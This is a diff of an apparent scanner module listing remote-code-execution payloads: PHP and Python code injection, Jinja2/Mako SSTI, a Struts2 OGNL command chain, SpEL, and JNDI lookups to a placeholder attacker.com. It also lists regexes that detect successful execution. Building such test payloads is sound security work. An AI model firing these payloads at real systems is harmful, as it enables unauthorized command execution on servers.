@@ -2,6 +2,7 @@
 RCE Payload 集合
 支持：PHP代码注入、Python代码注入、反序列化RCE、表达式注入
 """
+
 from typing import List, Dict
 
 # PHP代码注入payload
@@ -14,25 +15,20 @@ PHP_CODE_INJECTION_PAYLOADS: List[str] = [
     ";phpinfo();",
     "|phpinfo()",
     "`phpinfo()`",
-    
     # 变量覆盖 + 代码执行
     "$a='phpinfo';$a();",
     "${${phpinfo()}}",
     "${${$a}}" + "&a=phpinfo",
-    
     # preg_replace /e 修饰符（PHP < 7.0）
     "/.*/e",
     "preg_replace('/.*/e','phpinfo()','test')",
-    
     # assert() 注入
     "assert(phpinfo())",
     "call_user_func('phpinfo')",
     "create_function('','phpinfo()')",
-    
     # eval() 注入
     "eval('phpinfo();')",
     "eval(phpinfo())",
-    
     # system() 族
     "system('id')",
     "exec('id')",
@@ -49,9 +45,8 @@ PYTHON_CODE_INJECTION_PAYLOADS: List[str] = [
     "__import__('os').popen('id').read()",
     "os.system('id')",
     "subprocess.Popen('id',shell=True)",
-    "eval('__import__(\"os\").system(\"id\")')",
-    "exec('__import__(\"os\").system(\"id\")')",
-    
+    'eval(\'__import__("os").system("id")\')',
+    'exec(\'__import__("os").system("id")\')',
     # SSTI (Server-Side Template Injection)
     "{{7*7}}",
     "{{7*'7'}}",
@@ -59,12 +54,10 @@ PYTHON_CODE_INJECTION_PAYLOADS: List[str] = [
     "{{''.__class__.__mro__[2].__subclasses__()}}",
     "{{''.__class__.__bases__[0].__subclasses__()}}",
     "{%import os%}{{os.popen('id').read()}}",
-    
     # Jinja2 SSTI
     "{{''.__class__.__mro__[1].__subclasses__()}}",
     "{{config.__class__.__init__.__globals__}}",
     "{{request.application.__globals__.__builtins__}}",
-    
     # Mako SSTI
     "${7*7}",
     "${self.module.cache.util.os.popen('id').read()}",
@@ -76,21 +69,18 @@ JAVA_EXPRESSION_PAYLOADS: List[str] = [
     "${applicationScope}",
     "${pageContext}",
     "${Runtime.getRuntime().exec('id')}",
-    
     # OGNL (Struts2)
     "%{(#cmd='id')(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))"
-    "(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/sh','-c',#cmd}))" 
-    "(#p=new java.lang.ProcessBuilder(#cmds))" 
+    "(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/sh','-c',#cmd}))"
+    "(#p=new java.lang.ProcessBuilder(#cmds))"
     "(#p.redirectErrorStream(true))"
     "(#process=#p.start())"
     "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))"
-    "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))" 
+    "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))"
     "(#ros.flush())}",
-    
     # SpEL (Spring)
     "#{T(java.lang.Runtime).getRuntime().exec('id')}",
     "#{new java.lang.ProcessBuilder('id').start()}",
-    
     # JNDI注入
     "${jndi:ldap://attacker.com/exploit}",
     "${jndi:rmi://attacker.com/exploit}",
@@ -173,18 +163,15 @@ RCE_SUCCESS_PATTERNS: Dict[str, List[str]] = [
     r"root:x:0:0:",  # /etc/passwd
     r"total \d+\s+\d{4}-\d{2}-\d{2}",  # ls -la输出
     r"drwx[rx-]{9}",  # 目录权限
-    
     # Windows命令执行成功标识
     r"Volume Serial Number",
     r"Directory of [A-Z]:\\",
     r"<DIR>",
-    
     # phpinfo()特征
     r"PHP Version \d+\.\d+\.\d+",
     r"phpinfo\(\)",
     r"Configuration",
     r"PHP Core",
-    
     # 通用RCE测试标识
     r"RCE_TEST_[A-Z0-9]{16}",
 ]
